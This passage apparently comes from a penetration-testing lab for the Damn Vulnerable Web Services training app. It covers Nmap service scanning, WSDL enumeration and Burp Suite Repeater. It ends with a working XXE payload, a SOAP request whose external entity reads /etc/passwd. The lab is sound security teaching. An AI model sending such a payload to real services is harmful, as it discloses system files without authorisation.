### Scenario

API and Web Service reconnaissance is the foundation of testing modern cloud and microservices architectures. Web services frequently support legacy protocols like SOAP (Simple Object Access Protocol) alongside RESTful APIs. 

SOAP web services use Web Services Description Language (**WSDL**) documents to formally define accessible operations, parameters, data types, and endpoints. Penetration testers extract WSDL files to discover hidden functions and analyze XML processing engines. When XML parsers process unvalidated input with external entity resolution enabled, applications become vulnerable to XML External Entity (**XXE**) injection, allowing unauthorized access to system files (such as `/etc/passwd`).

In this exercise, we initialize the **Damn Vulnerable Web Services (DVWS)** platform on Ubuntu (`dvws-node`), perform network service scanning using Nmap from Parrot Security, map WSDL operations (`http://192.168.0.19:8080/dvwsuserservice?wsdl`), parse request schemas in Burp Suite Repeater, identify the service running on port 9090 (<font color="#ffd700"><b>zeus-admin</b></font>), and validate XXE file disclosure functionality (`file:///etc/passwd`).

### Objective

The objective of this lab is to help students learn how to:
- Deploy and configure containerized API application environments (`dvws-node`) and hosts entry resolution
- Conduct network service enumeration using Nmap (`nmap -sS`, `nmap -sV`) to identify target ports and services
- Access and parse SOAP WSDL documents (`http://192.168.0.19:8080/dvwsuserservice?wsdl`) to discover endpoints
- Intercept, modify, and analyze SOAP XML requests using Burp Suite Repeater
- Confirm system service identifications (<font color="#ffd700"><b>zeus-admin</b></font> on port 9090) and test for XXE external entity resolution

14. To test for XXE External Entity resolution, modify the Repeater request to include a custom `DOCTYPE` declaration pointing to `file:///etc/passwd`:

```http
POST /dvwsuserservice/ HTTP/1.1
Host: dvws.local
SOAPAction: "Username"
Content-Type: text/xml;charset=UTF-8
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY exploit SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:urn="urn:UserService">
  <soapenv:Header/>
  <soapenv:Body>
    <urn:Username>
      <username>&exploit;</username>
    </urn:Username>
  </soapenv:Body>
</soapenv:Envelope>
```
